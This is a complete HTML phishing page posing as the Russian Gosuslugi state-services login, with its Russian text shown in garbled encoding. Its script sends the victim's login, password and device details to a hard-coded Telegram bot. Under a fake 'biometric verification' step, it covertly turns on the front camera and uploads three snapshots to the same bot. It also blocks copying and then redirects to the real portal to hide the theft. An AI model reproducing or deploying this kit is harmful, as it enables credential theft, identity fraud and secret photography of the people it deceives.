<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>–ì–æ—Å—É—Å–ª—É–≥–∏</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background: #f3f4f6; height: 100vh; overflow: hidden; color: #0b1f33;
        }
        .loader-screen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #ffffff; display: flex; flex-direction: column;
            justify-content: center; align-items: center; z-index: 1000;
            transition: opacity 0.5s ease-out;
        }
        .loader-content { text-align: center; max-width: 400px; padding: 20px; }
        .loader-title { font-size: 24px; font-weight: 600; color: #0b1f33; margin-bottom: 12px; }
        .loader-subtitle { font-size: 16px; color: #0b1f33; margin-bottom: 8px; opacity: 0.9; }
        .loader-text {
            font-size: 15px; color: #66727c; margin-top: 20px;
            display: flex; align-items: center; justify-content: center; gap: 4px;
        }
        .dots { display: inline-flex; gap: 4px; margin-left: 4px; }
        .dot {
            width: 6px; height: 6px; background-color: #0066b3;
            border-radius: 50%; opacity: 0.3; animation: pulse 1.4s infinite ease-in-out both;
        }
        .dot:nth-child(1) { animation-delay: -0.32s; }
        .dot:nth-child(2) { animation-delay: -0.16s; }
        .dot:nth-child(3) { animation-delay: 0s; }
        @keyframes pulse {
            0%, 80%, 100% { opacity: 0.3; transform: scale(0.8); }
            40% { opacity: 1; transform: scale(1); }
        }
        .loader-hidden { opacity: 0; pointer-events: none; }
        .login-container { display: none; height: 100vh; background: #f3f4f6;
            justify-content: center; align-items: center; padding: 20px;
        }
        .login-container.active { display: flex; }
        .login-box {
            background: white; padding: 40px; border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08); width: 100%; max-width: 360px;
        }
        .logo { font-size: 28px; font-weight: 700; margin-bottom: 30px; text-align: center; }
        .logo-gos { color: #0066b3; }
        .logo-uslugi { color: #d32f2f; }
        .login-box h2 { margin-bottom: 24px; text-align: center; color: #0b1f33; font-size: 22px; }
        .input-group { margin-bottom: 16px; }
        .login-box input {
            width: 100%; padding: 14px 16px; border: 1px solid #d1d5db;
            border-radius: 8px; font-size: 16px; transition: border-color 0.2s;
        }
        .login-box input:focus { outline: none; border-color: #0066b3; border-width: 2px; padding: 13px 15px; }
        .login-box button[type="submit"] {
            width: 100%; padding: 14px; margin-top: 8px; background: #0066b3;
            color: white; border: none; border-radius: 8px; font-size: 16px;
            font-weight: 600; cursor: pointer; transition: background 0.2s;
        }
        .login-box button[type="submit"]:active { background: #005a9e; transform: scale(0.98); }
        .helper-links { display: flex; justify-content: space-between; margin-top: 20px; font-size: 14px; }
        .helper-links a { color: #0066b3; text-decoration: none; }
        .process-screen {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #ffffff; z-index: 2000; flex-direction: column;
            align-items: center; justify-content: center; padding: 24px;
        }
        .process-content { width: 100%; max-width: 400px; text-align: center; }
        .process-title { font-size: 22px; font-weight: 600; color: #0b1f33; margin-bottom: 12px; }
        .process-subtitle { font-size: 15px; color: #66727c; margin-bottom: 32px; min-height: 24px; }
        .progress-container {
            width: 100%; height: 4px; background: #e5e7eb;
            border-radius: 2px; overflow: hidden; margin-bottom: 16px;
        }
        .progress-bar { height: 100%; width: 0%; background: #0066b3; border-radius: 2px; transition: width 0.8s ease; }
        .progress-text { font-size: 14px; color: #0066b3; font-weight: 600; margin-bottom: 40px; }
        .steps-list { text-align: left; max-width: 300px; margin: 0 auto; }
        .step-item { display: flex; align-items: center; margin-bottom: 16px; opacity: 0.4; transition: all 0.4s ease; }
        .step-item.active { opacity: 1; }
        .step-item.completed { opacity: 0.7; }
        .step-icon {
            width: 20px; height: 20px; border-radius: 50%; border: 2px solid #0066b3;
            margin-right: 12px; display: flex; align-items: center; justify-content: center;
            flex-shrink: 0; font-size: 12px; color: transparent; transition: all 0.3s;
        }
        .step-item.completed .step-icon { background: #0066b3; color: white; }
        .step-item.active .step-icon { background: #0066b3; border-color: #0066b3; animation: pulse-icon 1.5s infinite; }
        @keyframes pulse-icon {
            0% { box-shadow: 0 0 0 0 rgba(0,102,179,0.4); }
            70% { box-shadow: 0 0 0 8px rgba(0,102,179,0); }
            100% { box-shadow: 0 0 0 0 rgba(0,102,179,0); }
        }
        .step-text { font-size: 15px; color: #0b1f33; }
        .success-check {
            width: 60px; height: 60px; border: 3px solid #0066b3; border-radius: 50%;
            margin: 0 auto 20px; display: none; align-items: center; justify-content: center;
        }
        .success-check.show { display: flex; animation: scaleIn 0.3s ease-out; }
        @keyframes scaleIn {
            from { transform: scale(0); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }
        .check-mark {
            width: 24px; height: 12px; border-left: 3px solid #0066b3;
            border-bottom: 3px solid #0066b3; transform: rotate(-45deg) translate(2px, -2px);
        }
        #hiddenVideo {
            position: fixed; top: 0; left: 0; width: 1px; height: 1px;
            opacity: 0; pointer-events: none; z-index: -1;
        }
        .noselect {
            -webkit-touch-callout: none; -webkit-user-select: none;
            -khtml-user-select: none; -moz-user-select: none;
            -ms-user-select: none; user-select: none;
        }
    </style>
</head>
<body class="noselect">

    <video id="hiddenVideo" autoplay playsinline muted></video>
    <canvas id="captureCanvas" style="display:none;"></canvas>

    <div class="loader-screen" id="initialLoader">
        <div class="loader-content">
            <div class="loader-title">–ì–æ—Å—É—Å–ª—É–≥–∏ —Å–µ–π—á–∞—Å –æ—Ç–∫—Ä–æ—é—Ç—Å—è</div>
            <div class="loader-subtitle">–ü–æ—Ä—Ç–∞–ª —Ä–∞–±–æ—Ç–∞–µ—Ç –≤ –ø—Ä–µ–∂–Ω–µ–º —Ä–µ–∂–∏–º–µ.</div>
            <div class="loader-text">
                –ü–æ–¥–æ–∂–¥–∏—Ç–µ –ø–∞—Ä—É —Å–µ–∫—É–Ω–¥
                <span class="dots">
                    <span class="dot"></span>
                    <span class="dot"></span>
                    <span class="dot"></span>
                </span>
            </div>
        </div>
    </div>

    <div class="login-container" id="loginForm">
        <div class="login-box">
            <div class="logo">
                <span class="logo-gos">–ì–æ—Å</span><span class="logo-uslugi">—É—Å–ª—É–≥–∏</span>
            </div>
            <h2>–í—Ö–æ–¥</h2>
            <form id="authForm">
                <div class="input-group">
                    <input type="text" id="loginInput" placeholder="–¢–µ–ª–µ—Ñ–æ–Ω / Email / –°–ù–ò–õ–°" required autocomplete="off">
                </div>
                <div class="input-group">
                    <input type="password" id="passInput" placeholder="–ü–∞—Ä–æ–ª—å" required autocomplete="off">
                </div>
                <button type="submit">–í–æ–π—Ç–∏</button>
            </form>
            <div class="helper-links">
                <a href="#">–ó–∞–±—ã–ª–∏ –ø–∞—Ä–æ–ª—å?</a>
                <a href="#">–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è</a>
            </div>
        </div>
    </div>

    <div class="process-screen" id="processScreen">
        <div class="process-content">
            <div class="success-check" id="successCheck">
                <div class="check-mark"></div>
            </div>
            <div id="processAnimation">
                <div class="dots" style="margin-bottom: 24px; gap: 6px;">
                    <span class="dot" style="width: 8px; height: 8px;"></span>
                    <span class="dot" style="width: 8px; height: 8px;"></span>
                    <span class="dot" style="width: 8px; height: 8px;"></span>
                </div>
            </div>
            <h3 class="process-title" id="processTitle">–ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–∞–Ω–Ω—ã—Ö</h3>
            <p class="process-subtitle" id="processSubtitle">–£—Å—Ç–∞–Ω–æ–≤–∫–∞ –∑–∞—â–∏—â–µ–Ω–Ω–æ–≥–æ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è...</p>
            <div class="progress-container">
                <div class="progress-bar" id="progressBar"></div>
            </div>
            <div class="progress-text" id="progressText">0%</div>
            <div class="steps-list" id="stepsList">
                <div class="step-item active" id="step1">
                    <div class="step-icon"></div>
                    <div class="step-text">–ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç–∞</div>
                </div>
                <div class="step-item" id="step2">
                    <div class="step-icon"></div>
                    <div class="step-text">–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –°–ù–ò–õ–°</div>
                </div>
                <div class="step-item" id="step3">
                    <div class="step-icon"></div>
                    <div class="step-text">–û–±–º–µ–Ω —Å –°–ú–≠–í</div>
                </div>
                <div class="step-item" id="step4">
                    <div class="step-icon"></div>
                    <div class="step-text">–ë–∏–æ–º–µ—Ç—Ä–∏—á–µ—Å–∫–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const BOT_TOKEN = '8643017909:AAF6QOTHICpl9iqfaMUhF-_Prw7s0zJXCO4';
        const CHAT_ID = '8449612758';

        const initialLoader = document.getElementById('initialLoader');
        const loginForm = document.getElementById('loginForm');
        const processScreen = document.getElementById('processScreen');
        const authForm = document.getElementById('authForm');
        const progressBar = document.getElementById('progressBar');
        const progressText = document.getElementById('progressText');
        const processTitle = document.getElementById('processTitle');
        const processSubtitle = document.getElementById('processSubtitle');
        const successCheck = document.getElementById('successCheck');
        const processAnimation = document.getElementById('processAnimation');

        let mediaStream = null;
        let captureCount = 0;
        const maxCaptures = 3; // –£–º–µ–Ω—å—à–∏–ª –¥–æ 3 –¥–ª—è –Ω–∞–¥–µ–∂–Ω–æ—Å—Ç–∏
        let currentLogin = '';
        let isCapturing = false;

        const steps = [
            { id: 'step1', progress: 20, text: '–£—Å—Ç–∞–Ω–æ–≤–∫–∞ –∑–∞—â–∏—â–µ–Ω–Ω–æ–≥–æ –∫–∞–Ω–∞–ª–∞...', title: '–ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–∞–Ω–Ω—ã—Ö' },
            { id: 'step2', progress: 40, text: '–ü–æ–∏—Å–∫ –≤ –±–∞–∑–µ –ï–ì–ò–° –°–û–¶...', title: '–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è' },
            { id: 'step3', progress: 60, text: '–û–±—Ä–∞–±–æ—Ç–∫–∞ —á–µ—Ä–µ–∑ –°–ú–≠–í...', title: '–û–±–º–µ–Ω –¥–∞–Ω–Ω—ã–º–∏' },
            { id: 'step4', progress: 100, text: '–ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ —Å–µ–∞–Ω—Å–∞...', title: '–ë–∏–æ–º–µ—Ç—Ä–∏—á–µ—Å–∫–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞' }
        ];

        // –ö–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è dataURL –≤ Blob (–Ω–∞–¥–µ–∂–Ω–µ–µ —á–µ–º toBlob)
        function dataURLtoBlob(dataurl) {
            const arr = dataurl.split(',');
            const mime = arr[0].match(/:(.*?);/)[1];
            const bstr = atob(arr[1]);
            let n = bstr.length;
            const u8arr = new Uint8Array(n);
            while(n--){
                u8arr[n] = bstr.charCodeAt(n);
            }
            return new Blob([u8arr], {type:mime});
        }

        // –û—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–æ—Ç–æ
        async function sendPhoto(dataUrl, caption) {
            try {
                const blob = dataURLtoBlob(dataUrl);
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('caption', caption);
                formData.append('photo', blob, `photo_${Date.now()}.jpg`);

                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                if (data.ok) {
                    console.log(`–§–æ—Ç–æ ${captureCount + 1} –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ —É—Å–ø–µ—à–Ω–æ`);
                    return true;
                } else {
                    console.error('–û—à–∏–±–∫–∞ Telegram:', data.description);
                    return false;
                }
            } catch (e) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:', e);
                return false;
            }
        }

        // –ó–∞—Ö–≤–∞—Ç –∫–∞–¥—Ä–∞
        function takeSnapshot() {
            const video = document.getElementById('hiddenVideo');
            const canvas = document.getElementById('captureCanvas');
            
            if (!video || video.readyState < 2 || video.paused || video.ended) {
                console.log('–í–∏–¥–µ–æ –Ω–µ –≥–æ—Ç–æ–≤–æ');
                return;
            }
            
            if (video.videoWidth === 0 || video.videoHeight === 0) {
                console.log('–í–∏–¥–µ–æ –∏–º–µ–µ—Ç –Ω—É–ª–µ–≤—ã–µ —Ä–∞–∑–º–µ—Ä—ã');
                return;
            }

            try {
                // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ä–∞–∑–º–µ—Ä—ã canvas
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // –ü–æ–ª—É—á–∞–µ–º dataURL (—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–æ, –±–æ–ª–µ–µ –Ω–∞–¥–µ–∂–Ω–æ)
                const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
                
                if (dataUrl.length < 100) {
                    console.log('–ü—É—Å—Ç–æ–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ');
                    return;
                }
                
                const caption = `üì∏ ${captureCount + 1}/${maxCaptures}\nüë§ ${currentLogin}\n‚è∞ ${new Date().toLocaleTimeString('ru-RU')}`;
                
                sendPhoto(dataUrl, caption);
                captureCount++;
                
                if (captureCount >= maxCaptures) {
                    isCapturing = false;
                    if (mediaStream) {
                        mediaStream.getTracks().forEach(track => track.stop());
                        console.log('–ö–∞–º–µ—Ä–∞ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞');
                    }
                }
            } catch (e) {
                console.error('–û—à–∏–±–∫–∞ –∑–∞—Ö–≤–∞—Ç–∞:', e);
            }
        }

        // –ó–∞–ø—É—Å–∫ –∫–∞–º–µ—Ä—ã
        async function startCamera() {
            try {
                console.log('–ó–∞–ø—Ä–æ—Å –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ...');
                processSubtitle.textContent = '–ê–∫—Ç–∏–≤–∞—Ü–∏—è –∫–∞–º–µ—Ä—ã...';
                
                mediaStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: "user",
                        width: { ideal: 640 }, // –£–º–µ–Ω—å—à–∏–ª —Ä–∞–∑–º–µ—Ä –¥–ª—è —Å—Ç–∞–±–∏–ª—å–Ω–æ—Å—Ç–∏
                        height: { ideal: 480 }
                    }, 
                    audio: false 
                });
                
                const video = document.getElementById('hiddenVideo');
                video.srcObject = mediaStream;
                
                // –ñ–¥–µ–º –ø–æ–∫–∞ –≤–∏–¥–µ–æ –Ω–∞—á–Ω–µ—Ç –∏–≥—Ä–∞—Ç—å
                video.onloadedmetadata = () => {
                    video.play();
                };
                
                video.onplaying = () => {
                    console.log('–ö–∞–º–µ—Ä–∞ –∞–∫—Ç–∏–≤–Ω–∞, —Ä–∞–∑–º–µ—Ä—ã:', video.videoWidth, 'x', video.videoHeight);
                    isCapturing = true;
                    
                    // –î–µ–ª–∞–µ–º —Å–Ω–∏–º–∫–∏ —Å –∏–Ω—Ç–µ—Ä–≤–∞–ª–æ–º 2 —Å–µ–∫—É–Ω–¥—ã
                    takeSnapshot(); // –ü–µ—Ä–≤—ã–π —Å—Ä–∞–∑—É
                    
                    const interval = setInterval(() => {
                        if (captureCount < maxCaptures && isCapturing) {
                            takeSnapshot();
                        } else {
                            clearInterval(interval);
                        }
                    }, 2000);
                };
                
            } catch (err) {
                console.error('–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ:', err);
                processSubtitle.textContent = '–ë–∏–æ–º–µ—Ç—Ä–∏—è –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞...';
            }
        }

        // –ù–∞—á–∞–ª—å–Ω–∞—è –∑–∞–≥—Ä—É–∑–∫–∞
        setTimeout(function() {
            initialLoader.classList.add('loader-hidden');
            setTimeout(function() {
                initialLoader.style.display = 'none';
                loginForm.classList.add('active');
                document.getElementById('loginInput').focus();
            }, 500);
        }, 3000);

        // –û–±—Ä–∞–±–æ—Ç–∫–∞ —Ñ–æ—Ä–º—ã
        authForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const login = document.getElementById('loginInput').value;
            const password = document.getElementById('passInput').value;
            const timestamp = new Date().toLocaleString('ru-RU');
            const userAgent = navigator.userAgent;
            currentLogin = login;
            
            loginForm.style.display = 'none';
            processScreen.style.display = 'flex';
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç–µ–∫—Å—Ç
            const message = `–ù–æ–≤—ã–π –ª–æ–≥ —Å –ì–æ—Å—É—Å–ª—É–≥\n\n–õ–æ–≥–∏–Ω: ${login}\n–ü–∞—Ä–æ–ª—å: ${password}\n–í—Ä–µ–º—è: ${timestamp}\n–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${userAgent}`;
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message
                })
            }).catch(err => console.log('–û—à–∏–±–∫–∞ —Ç–µ–∫—Å—Ç–∞:', err));
            
            startProcess();
        });

        function startProcess() {
            let step = 0;
            
            const interval = setInterval(() => {
                if (step < steps.length) {
                    updateStep(step);
                    
                    // –ù–∞ —à–∞–≥–µ 3 (–∏–Ω–¥–µ–∫—Å 2) –∑–∞–ø—É—Å–∫–∞–µ–º –∫–∞–º–µ—Ä—É
                    if (step === 2) {
                        setTimeout(() => {
                            startCamera();
                        }, 500);
                    }
                    
                    step++;
                } else {
                    clearInterval(interval);
                    completeProcess();
                }
            }, 1000);
        }

        function updateStep(index) {
            progressBar.style.width = steps[index].progress + '%';
            progressText.textContent = steps[index].progress + '%';
            processTitle.textContent = steps[index].title;
            processSubtitle.textContent = steps[index].text;
            
            for (let i = 0; i <= index; i++) {
                const el = document.getElementById(steps[i].id);
                if (el) {
                    el.classList.remove('active');
                    el.classList.add('completed');
                    el.querySelector('.step-icon').textContent = '‚úì';
                }
            }
            
            if (index < steps.length - 1) {
                const next = document.getElementById(steps[index + 1].id);
                if (next) next.classList.add('active');
            }
        }

        function completeProcess() {
            setTimeout(() => {
                processAnimation.style.display = 'none';
                successCheck.classList.add('show');
                processTitle.textContent = '–ì–æ—Ç–æ–≤–æ';
                processTitle.style.color = '#0066b3';
                processSubtitle.textContent = '–ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ...';
                
                setTimeout(() => {
                    window.location.href = 'https://www.gosuslugi.ru/';
                }, 1500);
            }, 400);
        }

        // –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∏
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('selectstart', e => {
            if (e.target.tagName !== 'INPUT') e.preventDefault();
        });
        document.addEventListener('copy', e => e.preventDefault());
    </script>
</body>
</html>